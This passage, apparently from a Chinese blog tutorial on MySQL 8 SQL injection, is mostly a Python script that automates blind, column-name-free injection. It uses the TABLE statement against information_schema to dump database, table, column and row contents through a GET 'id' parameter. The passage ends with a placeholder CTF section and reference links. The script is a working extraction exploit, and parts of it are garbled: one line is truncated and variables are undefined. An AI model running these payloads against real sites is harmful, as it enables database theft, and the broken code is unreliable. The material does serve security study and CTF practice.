    1' and ('def','security','uagents','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)(table information_schema.schemata limit "+num+",1)--+"
            name = ''
            for i in range(1,20):
                hexchar = ''
                for char in range(32, 126):
                    hexchar = str2hex(name + chr(char))
                    payloads = payload.format(hexchar)
                    #print(payloads)
                    urls = url + payloads
                    r = requests.get(url=urls)
                    if 'You are in' in r.text:
                        name += chr(char-1)
                        print(name)
                        break
    def tables_n(url,database): #无列名盲注爆数据表开始行数(可修改)
        payload = "1' and ('def','"+database+"','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)(table information_schema.tables limit "+num+",1)--+"
            name = ''
            for i in range(1,20):
                hexchar = ''
                for char in range(32, 126):
                    hexchar = str2hex(name + chr(char))
                    payloads = payload.format(hexchar)
                    #print(payloads)
                    urls = url + payloads
                    r = requests.get(url=urls)
                    if 'You are in' in r.text:
                        name += chr(char-1)
                        print(name)
                        break
    def columns_n(url,database,table): #无列名盲注爆字段开始行数(可修改)
        payload = "1' and ('def','"+database+"','"+table+"','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)(table information_schema.columns limit "+num+",1)--+"
            name = ''
            for i in range(1,20):
                hexchar = ''
                for char in range(32, 126):
                    hexchar = str2hex(name + chr(char))
                    payloads = payload.format(hexchar)
                    #print(payloads)
                    urls = url + payloads
                    r = requests.get(url=urls)
                    if 'You are in' in r.text:
                        name += chr(char-1)
                        print(name)
                        break
    def datas(url,table):  #无列名盲注爆数据(可修改)
        while True:
            print("请输入要爆第几个数据，如：1,2等:",end='')
            x = int(input())
            y = x-1
            num = str(y)
            if y (table "+table+" limit "+num+",1)--+"
            name = ''
            for i in range(1,20):
                hexchar = ''
                for char in range(32, 126):
                    hexchar = str2hex(name + chr(char))
                    payloads = payload.format(hexchar)
                    #print(payloads)
                    urls = url + payloads
                    r = requests.get(url=urls)
                    if 'You are in' in r.text:
                        name += chr(char-1)
                        print(name)
                        break
    if __name__ == "__main__":
        while True:
            print("请输入要操作的内容：\n1.爆当前数据库\n2.爆数据表开始行号\n3.爆数据表\n4.爆字段值开始行号\n5.爆字段值\n6.爆数据\n7.爆所有数据库")
            types = int(input())
            if types == 1:
                current_db(url)
            elif types == 2 or types == 3:
                print("请输入已经得到的数据库名:",end='')
                database = input()
                if types == 2:
                    tables_n(url,database)
                elif types == 3:
                    print("爆数据表开始行号:",end='')
                    n = int(input())
                    tables(url,database,n)
            elif types == 4 or types == 5:
                print("请输入已经得到的数据库名:",end='')
                database = input()
                print("请输入已经得到的数据表名:",end='')
                table = input()
                if types == 4:
                    columns_n(url,database,table)
                elif types == 5:
                    print("爆字段值开始行号:",end='')
                    n = int(input())
                    columns(url,database,table,n)
            elif types == 6:
                print("请输入要查询的数据表名:",end='')
                table = input()
                datas(url,table)
            else:
                dbs(url)
经测试基本没有问题。上边脚本是get型传参，且参数名为id的脚本。可根据实际情况进行修改。
## 0x06 CTF题目实战
暂时没有找到题目环境，找到后再总结  
参考：  
[RoarCTF部分题目WP](https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247489077&idx=1&sn=cd865192382b67c21ab6835dea99c94d&chksm=f9e000a4ce9789b2263e9cd8025c711687c4b6c5f22bb0e7854d77c124cf98d579616fb22377&mpshare=1&scene=23&srcid=1209qvPhLi3qrPCHX4DAMjRN&sharer_sharetime=1607478296433&sharer_shareid=9a768428f445de7c9f085723c18fd735#rd)
## 0x07 后记
上面记录了mysql8新特性的sql注入。可能会有个别不恰当之处，欢迎大师傅批评指正！
参考：  
[MYSQL8.0注入新特性](https://xz.aliyun.com/t/8646)  
[利用MySQL8新特性绕过select过滤](https://0xgeekcat.github.io/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html)  
[RoarCTF部分题目WP](https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247489077&idx=1&sn=cd865192382b67c21ab6835dea99c94d&chksm=f9e000a4ce9789b2263e9cd8025c711687c4b6c5f22bb0e7854d77c124cf98d579616fb22377&mpshare=1&scene=23&srcid=1209qvPhLi3qrPCHX4DAMjRN&sharer_sharetime=1607478296433&sharer_shareid=9a768428f445de7c9f085723c18fd735#rd)